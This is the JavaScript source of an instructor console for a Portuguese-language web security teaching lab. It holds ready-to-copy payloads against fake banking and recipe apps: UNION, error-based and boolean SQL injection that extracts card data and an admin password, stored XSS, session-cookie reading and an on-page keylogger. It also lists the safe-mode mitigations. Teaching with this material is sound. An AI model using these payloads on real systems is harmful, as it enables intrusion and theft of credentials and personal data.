/**
 * Console do instrutor (DAS v2.3, secao 6).
 *
 * Tudo que NAO pode aparecer na tela da plateia mora aqui: o roteiro de cada
 * cenario, os payloads prontos e um inspetor para sondar as rotas sem trocar de
 * aba no meio da demonstracao.
 *
 * A separacao nao e estetica. O aluno precisa ver um produto -- um banco, um
 * portal de receitas -- e nao uma ferramenta de ataque com o gabarito colado
 * na tela. Aqui o gabarito pode estar, porque aqui so olha quem conduz.
 *
 * Este arquivo nao desenha o conteudo de nenhum app e nao escreve em nenhuma
 * pagina de app. Ele fala com as mesmas rotas publicas que o aluno usa, mais
 * `/api/mode`, `/api/reset` e `/api/health`.
 *
 * NAO ha innerHTML neste arquivo, nem nos outros scripts do cliente. E a regra
 * que a oficina repete sobre saida de dado do servidor vale para as ferramentas
 * tambem: um painel do instrutor nao e um lugar seguro por ser "so do
 * instrutor". O roteiro e uma constante local e os payloads sao texto puro
 * dentro de <code>, com textContent.
 */

import {
  aplicarModoNoDocumento,
  copiarTexto,
  obterModo,
  reiniciarLab,
  rotuloDoModo,
} from './lab.js';
import { montarControleModo } from './chrome.js';

/* -------------------------------------------------------------------------- */
/* Roteiro e payloads                                                         */
/* -------------------------------------------------------------------------- */

/**
 * Os cenarios, na ordem da apresentacao.
 *
 * `sonda` diz ao inspetor qual rota e qual parametro aquele cenario ataca: quem
 * troca de cenario troca tambem o alvo do inspector, e nao precisa lembrar qual
 * nome de query string usar.
 *
 * `url` e a navegacao contextual do DAS v2.4, secao 16.2: e a pagina EXATA da
 * demonstracao, com o estado que o instrutor ja tinha na tela. Ela vem de uma
 * lista fixa deste arquivo e nunca e montada a partir de dados vindos do
 * navegador -- o DAS pede isso explicitamente, e com razao: um console que
 * concatena o que o navegador mandou num `href` seria um XSS esperando o
 * instrutor clicar. A URL e conhecida; o clique apenas a copia.
 *
 * Nos passos, o que esta entre crases vira <code>. E a unica marcacao do
 * roteiro, e ela e montada por nos de texto -- ver `passoComMarcacao`.
 */
const CENARIOS = [
  {
    id: 'uniao',
    nome: 'UNION em agencias',
    url: '/finbank/agencias',
    descricao: 'SQLi por UNION: quatro colunas, quatro dados de cartao.',
    passos: [
      'Abra `/finbank/agencias` e filtre por `Sao Paulo`. Duas agencias aparecem.',
      'Troque a cidade por `Atlantis`: zero resultados, sem erro. A consulta aceitou o texto.',
      "Fechando a aspa e abrindo outra, o payload entra no meio da consulta. Copie o segundo payload do painel ao lado.",
      'Os cartoes aparecem como se fossem agencias: quatro campos, na ordem da tabela.',
      'Repita em `Seguro`. A mesma string nao altera nada, e a lista volta vazia.',
    ],
    payloads: [
      {
        rotulo: 'Cidade inexistente',
        valor: 'Atlantis',
        nota: 'Nenhum erro: a consulta rodou e nao achou nada.',
      },
      {
        rotulo: 'UNION SELECT, quatro colunas',
        valor:
          "' UNION SELECT titular, numero_cartao, cvv, validade FROM cartoes_credito -- ",
        nota: 'O espaco depois de -- fecha o comentario do MySQL.',
      },
      {
        rotulo: 'Dado que ja estava ali',
        valor:
          "' UNION SELECT CONCAT(nome_agencia, ' - ', cidade), endereco, telefone, gerente FROM agencias -- ",
        nota: 'Prova que o vazamento tambem alcanca dados que o aluno ja via.',
      },
    ],
    sonda: { rota: '/banco/agencias', parametro: 'cidade' },
  },
  {
    id: 'erro',
    nome: 'Erro do MySQL no extrato',
    url: '/finbank/extrato?id_conta=98765',
    descricao: 'SQLi baseada em erro: o detalhe da consulta volta na resposta.',
    passos: [
      'Abra `/finbank/extrato`. A conta `CLI001` ja vem carregada.',
      'Repare no bloco `Detalhe tecnico` no meio da tela: ele existe, fechado e vazio.',
      'Em `Vulneravel`, cole o payload de `EXTRACTVALUE` no campo da conta.',
      'A tela mostra HTTP 500 e, ao abrir o detalhe, a mensagem do MySQL com a senha sintetica do administrador.',
      'Em `Seguro`, o mesmo payload devolve a mensagem generica e o bloco de detalhe nem aparece.',
    ],
    payloads: [
      {
        rotulo: 'Conta valida',
        valor: 'CLI001',
        nota: 'O caminho normal: tres lancamentos.',
      },
      {
        rotulo: 'EXTRACTVALUE, extrai a senha (variante da apresentacao)',
        valor:
          "98765' AND EXTRACTVALUE(1, CONCAT(1, (SELECT senha FROM administradores WHERE id_admin='1'))) -- ",
        nota: 'Prefixo inteiro em vez de 0x7e: a mensagem do erro comeca com 1 e a causa fica obvia.',
      },
      {
        rotulo: 'EXTRACTVALUE, confirma o usuario',
        valor:
          "98765' AND EXTRACTVALUE(1, CONCAT(1, (SELECT username FROM administradores WHERE id_admin='1'))) -- ",
        nota: 'Trocar a coluna troca o dado: o erro carrega o que voce pediu.',
      },
      {
        rotulo: 'Referencia: a variante com 0x7e',
        valor:
          "98765' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT senha FROM administradores WHERE id_admin='1'))) -- ",
        nota: 'Funciona igual. O ~ era um marcador visual, e atrapalha mais do que ajuda na apresentacao.',
      },
    ],
    sonda: { rota: '/banco/extrato', parametro: 'id_conta' },
  },
  {
    id: 'oraculo',
    nome: 'Oraculo booleano no comunicado',
    url: '/finbank/noticia?id=5',
    descricao: 'SQLi inferencial: a resposta e 200 ou 404, e isso basta.',
    passos: [
      'Abra `/finbank/noticia`. O comunicado 5 aparece: essa e a linha de base.',
      'Troque o id por `999999`: a tela diz que nao foi encontrado. Este 404 e o sinal.',
      "Use `' OR 1=1 -- `: volta 200. Use `' AND 1=2 -- `: volta 404.",
      'A condicao booleana virou resposta HTTP. Nada de `SELECT` escrito na tela.',
      "Para reconstruir um texto, posicione a condicao com `id='1' AND SUBSTRING(...)` e varie o alfabeto.",
    ],
    payloads: [
      {
        rotulo: 'Linha de base',
        valor: '5',
        nota: 'Existe: 200 com o comunicado.',
      },
      {
        rotulo: 'Condicao verdadeira',
        valor: "' OR 1=1 -- ",
        nota: 'Tautologia: 200.',
      },
      {
        rotulo: 'Condicao falsa',
        valor: "' AND 1=2 -- ",
        nota: 'Nunca verdadeira: 404.',
      },
      {
        rotulo: 'Um caractere da posicao 1',
        valor: "' OR (id='1' AND SUBSTRING(titulo,1,1)='F') -- ",
        nota: 'Com BINARY no lugar de SUBSTRING, a comparacao volta a distinguir caixa.',
      },
    ],
    sonda: { rota: '/banco/noticia', parametro: 'id' },
  },
  {
    id: 'xss',
    nome: 'XSS armazenado nos comentarios',
    url: '/cheflab/receita',
    descricao: 'XSS armazenado: o codigo roda sozinho, a cada visita.',
    passos: [
      'Abra `/cheflab/receita` e role ate os comentarios da receita.',
      'Em `Vulneravel`, publique o primeiro payload no campo de comentario.',
      'O `alert` dispara na hora. Recarregue a pagina: dispara de novo, sem clicar em nada.',
      'No mesmo modo, cole o segundo payload no campo `Seu nome`: o autor e um segundo sink.',
      'Em `Seguro`, os dois payloads aparecem como texto, e nenhum dialogo abre.',
    ],
    payloads: [
      {
        rotulo: 'Comentario, dispara sozinho',
        valor: '<img src=x onerror=alert(document.domain)>',
        nota: 'Sem interacao: e o que torna o XSS armazenado.',
      },
      {
        rotulo: 'Nome do autor, segundo sink',
        valor: '<img src=x onerror=alert(1)>',
        nota: 'O roteiro antigo citava so o texto do comentario.',
      },
      {
        rotulo: 'Marca visivel, sem alerta',
        valor: '<b>teste</b>',
        nota: 'Serve para mostrar a linha renderizada sem interromper a aula.',
      },
    ],
    sonda: { rota: '/banco/comunicados', parametro: '' },
  },
  {
    id: 'perfil',
    nome: 'XSS armazenado no perfil',
    url: '/finbank/perfil?id_cliente=CLI001',
    descricao: 'O mesmo armazenamento, em outro produto do mesmo sistema.',
    passos: [
      'Abra `/finbank/perfil`. O perfil de `CLI001` ja vem com a descricao do seed.',
      'Em `Vulneravel`, cole o payload no campo `Texto do perfil` e clique em `Salvar perfil`.',
      'O `alert` dispara na hora. Recarregue a pagina: dispara de novo, sem clicar em nada.',
      'Repare no que NAO mudou: a rota e a mesma dos outros cenarios, e o `id_cliente` vai parametrizado nos dois modos. Aqui nao ha SQLi.',
      'Em `Seguro`, a mesma marcacao aparece como texto, e nenhum dialogo abre.',
    ],
    payloads: [
      {
        rotulo: 'Perfil, dispara sozinho',
        valor: '<img src=x onerror=alert(document.domain)>',
        nota: 'O mesmo payload do ChefLab, em outra tabela. E a repeticao que prova a tese.',
      },
      {
        rotulo: 'Marca visivel, sem alerta',
        valor: '<b>teste</b>',
        nota: 'Serve para mostrar a linha renderizada sem interromper a aula.',
      },
      {
        rotulo: 'Referencia: o mesmo sink no ChefLab',
        valor: '<img src=x onerror=alert(document.domain)>',
        nota: 'Valor identico ao primeiro. Cole no mural de `/cheflab/receita` e compare.',
      },
    ],
    sonda: { rota: '/banco/perfil', parametro: 'id_cliente' },
  },
  {
    id: 'cookie',
    nome: 'Cookie de sessao e HttpOnly',
    url: '/finbank/perfil',
    descricao: 'lab_session legivel no vuln, invisivel para o script no safe.',
    passos: [
      'Com `/finbank/perfil` aberta, abra o console do navegador e digite `document.cookie`.',
      'Em `Vulneravel`, a resposta e `lab_session=sess-vuln-alunoNN`.',
      'Troque para `Seguro` neste console, digite de novo: a resposta agora e uma string vazia.',
      'O cookie NAO sumiu do navegador: ele continua na aba, em devtools, com o mesmo nome. O que mudou foi o atributo `HttpOnly`, e por isso que o script parou de ve-lo.',
      'Repare que `lab_mode` nunca aparece no console. Ele e HttpOnly nos DOIS modos -- e essa e a razao de o payload nao conseguir escolher o modo `vuln` sozinho.',
      'Para provar pelo payload, salve o segundo payload na bio e le o atributo `data-sessao` no <html>.',
    ],
    payloads: [
      {
        rotulo: 'Console do navegador, nao o formulario',
        valor: 'document.cookie',
        nota: 'Cole no console (F12), nao no campo de texto: aqui o comando e executado.',
      },
      {
        rotulo: 'No console, o que a pagina ve',
        valor: 'document.querySelector("html").dataset.sessao',
        nota: 'Depois de salvar o payload abaixo. No vuln traz a sessao; no safe, uma string vazia.',
      },
      {
        rotulo: 'Payload que le a sessao e publica na tela',
        valor:
          '<img src=x onerror=document.documentElement.setAttribute("data-sessao",document.cookie)>',
        nota: 'No vuln o atributo recebe a sessao. No safe recebe "", porque HttpOnly nao volta para o script.',
      },
    ],
    sonda: { rota: '/banco/perfil', parametro: 'id_cliente' },
  },
  {
    id: 'leitura',
    nome: 'Keylogger didatico',
    url: '/finbank/perfil',
    descricao: 'Listeners de teclado nos campos do laboratorio, com saida na propria tela.',
    passos: [
      'Role ate o bloco `Dados de laboratorio`. Os dois campos aceitam qualquer coisa ficticia.',
      'Em `Vulneravel`, cole o payload no campo `Texto do perfil` e salve.',
      'Digite de novo nos campos da bancada: cada tecla aparece em `Leitura pelo payload`.',
      'Nada saiu da maquina. A leitura acontece no navegador e o resultado fica no painel desta pagina.',
      'Em `Seguro`, o painel continua vazio, porque nenhum listener foi registrado.',
    ],
    payloads: [
      {
        rotulo: 'Leitura dos dois campos, com rotulo por tecla',
        valor:
          '<img src=x onerror="' +
          'document.querySelectorAll(\'[data-lab-input]\').forEach(c=>{' +
          'c.addEventListener(\'keydown\',e=>{' +
          'document.querySelector(\'#lab-eventos\').textContent+=' +
          '\'[lab:\'+c.dataset.labInput+\'] \'+e.key+\'\\n\';});});">',
        nota: 'Sem fetch, sem WebSocket, sem imagem externa: o alvo e #lab-eventos, na propria pagina.',
      },
      {
        rotulo: 'Mostra o valor completo dos campos, no change',
        valor:
          '<img src=x onerror="' +
          'document.querySelectorAll(\'[data-lab-input]\').forEach(c=>{' +
          'c.addEventListener(\'change\',()=>{' +
          'document.querySelector(\'#lab-eventos\').textContent+=' +
          '\'[lab:\'+c.dataset.labInput+\'] \'+c.value+\'\\n\';});});">',
        nota: 'Dispara ao sair do campo. Mostra o valor inteiro em vez de uma tecla por vez.',
      },
    ],
    sonda: { rota: '/banco/perfil', parametro: 'id_cliente' },
  },
];

/**
 * Resumo das protecoes ativas no modo seguro (DAS v2.4, secao 16.1 / T15).
 *
 * O pedido do feedback da equipe foi literal: "ao ativar o modo seguro, o
 * console deve explicar o que foi feito para proteger o sistema". Este e o
 * lugar onde essa explicacao acontece, e ela e uma lista CURTA de correlatos
 * verificaveis -- cada item diz o que mudou e onde o aluno pode ver.
 *
 * Sao quatro itens e nao um manual, e essa e a decisao: o painel aparece no
 * meio da demonstracao, e um texto longo ali seria lido por cima da aula. Cada
 * linha responde a uma pergunta que o aluno sempre faz -- "isso resolve o
 * problema?" -- e cada uma aponta um lugar do codigo, porque a prova de que a
 * mitigacao existe esta no repositorio, nao na promessa.
 */
const MITIGACOES = [
  {
    titulo: 'Prepared statement no lugar de concatenacao',
    detalhe:
      'A consulta parametrizada impede que a entrada do usuario vire sintaxe SQL.',
    onde: 'src/repositories/bancoRepository.js',
  },
  {
    titulo: 'Erro generico, sem detalhe do MySQL',
    detalhe:
      'A resposta nao carrega mais a mensagem do banco, entao ela deixa de ser um oraculo.',
    onde: 'src/middleware/errorHandler.js',
  },
  {
    titulo: 'Saida de texto em vez de innerHTML',
    detalhe:
      'A marcacao gravada aparece como caracteres, e nunca vira elemento nem atributo de evento.',
    onde: 'src/public/finbank/perfil.js e src/public/cheflab/receita.js',
  },
  {
    titulo: 'HttpOnly no cookie de sessao e no de modo',
    detalhe:
      'lab_session e legivel no vuln e some para o script no safe; lab_mode nunca e legivel.',
    onde: 'src/middleware/mode.js',
  },
];

/** Rotas oferecidas pelo inspetor, com o parametro de cada uma. */
const ROTAS_INSPETOR = [
  { rota: '/banco/agencias', parametro: 'cidade' },
  { rota: '/banco/extrato', parametro: 'id_conta' },
  { rota: '/banco/noticia', parametro: 'id' },
  { rota: '/banco/comunicados', parametro: '' },
  { rota: '/banco/perfil', parametro: 'id_cliente' },
];

/* -------------------------------------------------------------------------- */
/* Atalhos de DOM                                                             */
/* -------------------------------------------------------------------------- */

/**
 * As anotacoes `/** @type {HTMLSelectElement} *\/` sao para o `tsc --checkJs`:
 * `querySelector` devolve `Element`, que nao tem `value`. Nenhuma delas altera o
 * runtime. Ver a mesma explicacao em src/public/cheflab/receita.js.
 */
const seletorCenario = /** @type {HTMLSelectElement} */ (
  document.querySelector('#seletor-cenario')
);
const seletorRota = /** @type {HTMLSelectElement} */ (
  document.querySelector('#seletor-rota')
);
const campoParametro = /** @type {HTMLInputElement} */ (
  document.querySelector('#campo-parametro')
);
const campoValor = /** @type {HTMLInputElement} */ (
  document.querySelector('#campo-valor')
);
const botaoSondar = /** @type {HTMLButtonElement} */ (
  document.querySelector('#botao-sondar')
);
const botaoReset = /** @type {HTMLButtonElement} */ (
  document.querySelector('#palco-reset')
);

const alvoAtivo = /** @type {HTMLAnchorElement} */ (
  document.querySelector('#alvo-ativo')
);
const descricaoCenario = document.querySelector('#descricao-cenario');
const listaPassos = document.querySelector('#lista-passos');
const listaPayloads = document.querySelector('#lista-payloads');
const seloModo = document.querySelector('#palco-modo');
const saude = document.querySelector('#palco-saude');
const contexto = document.querySelector('#palco-contexto');
const painelMitigacoes = document.querySelector('#painel-mitigacoes');
const listaMitigacoes = document.querySelector('#lista-mitigacoes');
const statusSonda = document.querySelector('#sonda-status');
const corpoSonda = document.querySelector('#sonda-json');
const controleModo = /** @type {HTMLElement} */ (
  document.querySelector('#palco-modo-controle')
);

/* -------------------------------------------------------------------------- */
/* Utilidades locais                                                          */
/* -------------------------------------------------------------------------- */

/** Escreve texto sem passar por innerHTML. */
function preencher(elemento, texto) {
  if (elemento) {
    elemento.textContent = texto;
  }
}

/**
 * Monta um passo de roteiro, com crases virando <code>.
 *
 * O roteiro precisa mostrar o que colar e em qual campo, e o `<code>` e o que
 * distingue as duas coisas a tres metros de distancia. A marcacao e a
 * delimitacao por crases, e cada pedaco entra por `textContent`: nao existe
 * interpretacao de HTML em nenhum ponto deste arquivo.
 */
function passoComMarcacao(texto) {
  const pedacos = texto.split(/`([^`]+)`/g);
  const nos = [];

  pedacos.forEach((pedaco, indice) => {
    if (pedaco === '') {
      return;
    }

    if (indice % 2 === 1) {
      const codigo = document.createElement('code');
      codigo.textContent = pedaco;
      nos.push(codigo);
      return;
    }

    nos.push(document.createTextNode(pedaco));
  });

  return nos;
}

/* -------------------------------------------------------------------------- */
/* Roteiro                                                                    */
/* -------------------------------------------------------------------------- */

/** Cenario corrente, resolvido pelo id do <select>. */
function cenarioAtual() {
  const escolhido = CENARIOS.find((item) => item.id === seletorCenario.value);
  return escolhido ?? CENARIOS[0];
}

function desenharCenario() {
  const cenario = cenarioAtual();

  preencher(descricaoCenario, cenario.descricao);
  preencher(document.querySelector('#alvo-cenario'), `Tela: ${cenario.url}`);

  /**
   * A URL ABSOLUTA no botao, e nao a relativa.
   *
   * Na implantacao por portas o mesmo cenario corresponde a uma pagina diferente
   * em cada bancada, e o botao que devolve o aluno para a tela demonstrada
   * precisa deixar isso visivel: `localhost:3007/finbank/perfil` e
   * `localhost:3003/finbank/perfil` sao bancadas diferentes, com cookies e
   * bancos diferentes. Um link relativo esconderia exatamente o dado que o
   * instrutor precisa conferir antes de clicar (DAS v2.4, secao 16.2 e 16.3).
   */
  if (alvoAtivo) {
    const destino = new URL(cenario.url, window.location.origin);
    alvoAtivo.href = destino.href;
    preencher(alvoAtivo, `abrir ${destino.href}`);
  }

  // Passos: numero grande, para quem conduz ler de longe.
  const passos = document.createDocumentFragment();
  cenario.passos.forEach((texto, indice) => {
    const passo = document.createElement('div');
    passo.className = 'passo';

    const numero = document.createElement('span');
    numero.className = 'passo__num';
    numero.textContent = String(indice + 1);

    const corpo = document.createElement('span');
    corpo.className = 'passo__texto';
    corpo.append(...passoComMarcacao(texto));

    passo.append(numero, corpo);
    passos.append(passo);
  });
  listaPassos.replaceChildren(passos);

  desenharPayloads(cenario);
  sincronizarInspetor(cenario.sonda);
}

/**
 * Payload + botao de copiar.
 *
 * O botao copia para a area de transferencia: o caminho mais curto entre "esta
 * na tela do instrutor" e "esta no campo do aluno" e um Ctrl+V. Um botao que
 * preenchesse o campo da outra aba exigiria permissao de acesso entre janelas,
 * e navegador nenhum concede isso.
 */
function desenharPayloads(cenario) {
  const linhas = document.createDocumentFragment();

  for (const payload of cenario.payloads) {
    const linha = document.createElement('div');
    linha.className = 'payload-linha';

    const coluna = document.createElement('div');

    const rotulo = document.createElement('span');
    rotulo.className = 'payload-linha__rotulo';
    rotulo.textContent = payload.rotulo;

    const codigo = document.createElement('code');
    codigo.textContent = payload.valor;

    const nota = document.createElement('span');
    nota.className = 'payload-linha__rotulo';
    nota.textContent = payload.nota;

    coluna.append(rotulo, codigo, nota);

    const copiar = document.createElement('button');
    copiar.type = 'button';
    copiar.className = 'botao botao--mini';
    copiar.textContent = 'copiar';

    copiar.addEventListener('click', async () => {
      const ok = await copiarTexto(payload.valor);
      copiar.textContent = ok ? 'copiado' : 'falhou';
      setTimeout(() => {
        copiar.textContent = 'copiar';
      }, 1200);
    });

    linha.append(coluna, copiar);
    linhas.append(linha);
  }

  listaPayloads.replaceChildren(linhas);
}

/* -------------------------------------------------------------------------- */
/* Inspetor                                                                   */
/* -------------------------------------------------------------------------- */

function sincronizarInspetor(sonda) {
  seletorRota.value = sonda.rota;
  campoParametro.value = sonda.parametro;
  campoValor.value = '';
  limparSonda();
}

function limparSonda() {
  preencher(statusSonda, '');
  preencher(corpoSonda, 'nenhuma sondagem ainda');
  corpoSonda.classList.add('inspetor-json--vazio');
}

seletorRota.addEventListener('change', () => {
  const escolhida = ROTAS_INSPETOR.find((item) => item.rota === seletorRota.value);
  campoParametro.value = escolhida?.parametro ?? '';
  campoValor.value = '';
  limparSonda();
});

/**
 * Executa um GET e mostra status e corpo.
 *
 * E um GET puro, sem escrita e sem parametro obrigatorio: a unica coisa que
 * diferencia a sondagem do ataque e o que foi digitado no campo de valor.
 */
async function sondar() {
  botaoSondar.disabled = true;
  preencher(statusSonda, 'consultando...');
  corpoSonda.classList.remove('inspetor-json--vazio');

  try {
    const url = new URL(seletorRota.value, window.location.origin);
    if (campoParametro.value) {
      url.searchParams.set(campoParametro.value, campoValor.value);
    }

    const resposta = await fetch(url.pathname + url.search, {
      headers: { Accept: 'application/json' },
    });

    const tipo = resposta.headers.get('content-type') ?? 'sem tipo';
    const texto = await resposta.text();

    let corpo = texto;
    try {
      corpo = JSON.stringify(JSON.parse(texto), null, 2);
    } catch {
      // Resposta que nao e JSON e mostrada como veio: em um laboratorio de
      // SQLi, ver o corpo cru e o que interessa.
    }

    preencher(statusSonda, `HTTP ${resposta.status} · ${tipo}`);
    preencher(corpoSonda, corpo);
  } catch (erro) {
    preencher(statusSonda, 'falha na sondagem');
    preencher(corpoSonda, String(/** @type {Error} */ (erro)?.message ?? erro));
  } finally {
    botaoSondar.disabled = false;
  }
}

botaoSondar.addEventListener('click', sondar);

/* -------------------------------------------------------------------------- */
/* Controle de sessao                                                         */
/* -------------------------------------------------------------------------- */

/** Repinta o console com o modo vigente. Nao recarrega a pagina. */
function pintarModo(modo) {
  aplicarModoNoDocumento(modo);
  montarControleModo(controleModo, modo, trocarModo);
  preencher(seloModo, rotuloDoModo(modo));
  desenharMitigacoes(modo);
}

/**
 * Resumo das protecoes, so no modo seguro (DAS v2.4, secao 16.1).
 *
 * O painel some no modo vulneravel em vez de aparecer esmaecido. Esmaecido
 * seria ambiguo: daria para ler "estas protecoes existem mas estao desligadas",
 * o que e falso -- no vuln elas nao estao no codigo que roda. Ausente e a
 * afirmacao correta.
 */
function desenharMitigacoes(modo) {
  if (!painelMitigacoes || !listaMitigacoes) {
    return;
  }

  const seguro = modo === 'safe';
  painelMitigacoes.classList.toggle('oculto', !seguro);

  if (!seguro) {
    return;
  }

  // A lista e montada uma unica vez: `trocarModo` roda a cada clique e refazer a
  // lista inteira nao mudaria nada na tela.
  if (listaMitigacoes.childElementCount > 0) {
    return;
  }

  const itens = document.createDocumentFragment();

  for (const mitigacao of MITIGACOES) {
    const item = document.createElement('li');
    item.className = 'mitigacao';

    const titulo = document.createElement('strong');
    titulo.className = 'mitigacao__titulo';
    titulo.textContent = mitigacao.titulo;

    const detalhe = document.createElement('span');
    detalhe.className = 'mitigacao__detalhe';
    detalhe.textContent = mitigacao.detalhe;

    const onde = document.createElement('code');
    onde.className = 'mitigacao__onde';
    onde.textContent = mitigacao.onde;

    item.append(titulo, detalhe, onde);
    itens.append(item);
  }

  listaMitigacoes.replaceChildren(itens);
}

/**
 * Troca o modo sem recarregar.
 *
 * Nas paginas de app, trocar de modo RECARREGA, porque o backend decide o que
 * cada pagina renderiza e a pagina precisa ser redesenhada. No console nao ha o
 * que redesenhar: o console e o mesmo nos dois modos, e recarregar apagaria o
 * roteiro selecionado no meio da demonstracao.
 */
async function trocarModo(modo) {
  try {
    await fetch('/api/mode', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mode: modo }),
    });
  } catch (erro) {
    console.warn('[palco] troca de modo falhou:', erro.message);
  }

  pintarModo(modo);
  await consultarSaude();
}

/**
 * Sonda de saude.
 *
 * `tabelas` vem do `/api/health` (DAS, secao 7). Sao dois numeros que
 * respondem "o laboratorio esta de pe?" sem abrir o terminal no meio da
 * apresentacao.
 *
 * O mesmo endpoint traz `aluno`, e ele e o requisito do DAS v2.4 secao 16.3:
 * deixar explicito qual laboratorio esta sendo controlado. Na implantacao por
 * portas sao treze stacks independentes, e um `POST /api/reset` disparado na
 * mesa errada apaga a demonstracao de outro aluno sem nenhum sinal visivel.
 * A origem exibida ao lado vem do `location.origin` do navegador -- o servidor
 * nao sabe por qual URL publica o aluno chegou, e inventar esse dado seria pior
 * do que nao exibi-lo.
 */
async function consultarSaude() {
  try {
    const resposta = await fetch('/api/health', {
      headers: { Accept: 'application/json' },
    });
    const dados = await resposta.json();

    if (!resposta.ok) {
      preencher(saude, 'banco indisponivel');
      preencher(contexto, `bancada ${dados.aluno ?? 'desconhecida'} · banco fora do ar`);
      return;
    }

    preencher(saude, `banco ${dados.banco} · ${dados.tabelas} tabelas`);
    preencher(
      contexto,
      `controlando ${dados.aluno} · ${window.location.origin}`,
    );
  } catch {
    preencher(saude, 'banco indisponivel');
    preencher(contexto, 'bancada desconhecida');
  }
}

/* -------------------------------------------------------------------------- */
/* Inicializacao                                                              */
/* -------------------------------------------------------------------------- */

for (const cenario of CENARIOS) {
  const opcao = document.createElement('option');
  opcao.value = cenario.id;
  opcao.textContent = cenario.nome;
  seletorCenario.append(opcao);
}

for (const rota of ROTAS_INSPETOR) {
  const opcao = document.createElement('option');
  opcao.value = rota.rota;
  opcao.textContent = rota.parametro
    ? `${rota.rota}?${rota.parametro}=`
    : rota.rota;
  seletorRota.append(opcao);
}

seletorCenario.addEventListener('change', desenharCenario);
botaoReset.addEventListener('click', reiniciarLab);

pintarModo(await obterModo());
desenharCenario();
limparSonda();
await consultarSaude();
setInterval(consultarSaude, 5000);
